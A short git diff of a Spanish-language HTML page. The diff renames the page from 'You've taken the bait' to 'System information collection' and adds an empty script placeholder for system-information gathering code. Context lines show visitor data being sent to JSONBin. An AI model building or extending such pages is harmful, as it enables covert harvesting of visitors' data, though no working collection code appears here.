@@ -1,6 +1,6 @@
 <html>
 <head>
-    <title>Has mordido el anzuelo</title>
+    <title>Recopilación de Información del Sistema</title>
     <style>
         body {
             background-color: black;
@@ -86,6 +86,10 @@
             console.log("Datos enviados a JSONBin:", data);
         })
         .catch(error => console.error("Error al enviar datos a JSONBin:", error));
+    </script>
+
+    <script>
+        // Código adicional para recopilar información del sistema (coloca aquí el código proporcionado previamente)
     </script>
 </body>
 </html>
